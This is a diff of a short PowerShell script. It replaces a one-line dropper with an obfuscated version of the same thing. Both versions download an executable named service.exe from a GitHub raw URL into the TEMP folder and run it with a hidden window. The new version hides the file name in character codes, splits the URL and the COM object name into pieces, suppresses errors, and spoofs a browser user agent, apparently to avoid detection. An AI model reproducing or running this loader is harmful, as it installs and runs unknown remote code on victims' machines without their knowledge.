@@ -1,1 +1,20 @@
-(New-Object Net.WebClient).DownloadFile('https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/service.exe', "$env:TEMP\service.exe"); Start-Process "$env:TEMP\service.exe" -WindowStyle Hidden
+$n = -join [char[]](115,101,114,118,105,99,101)
+$x = -join [char[]](46,101,120,101)
+$p = [IO.Path]::Combine([Environment]::GetEnvironmentVariable('TEMP'), $n + $x)
+
+$a = 'https://github.com/matvejsklarov9-cyber/'
+$b = 'my/raw/refs/heads/main/'
+$u = $a + $b + $n + $x
+
+Import-Module BitsTransfer -Verbose:$false -WarningAction SilentlyContinue
+Start-BitsTransfer -Source $u -Destination $p -Priority Foreground -ErrorAction SilentlyContinue
+
+if (-not (Test-Path $p)) {
+    $r = [Net.WebRequest]::Create($u)
+    $r.UserAgent = 'Mozilla/5.0'
+    $s = $r.GetResponse().GetResponseStream()
+    $f = [IO.File]::Create($p); $s.CopyTo($f); $f.Close(); $s.Close()
+}
+
+$sh = New-Object -ComObject ('Shell.' + 'Application')
+$sh.ShellExecute($p, '', '', 'open', 0)
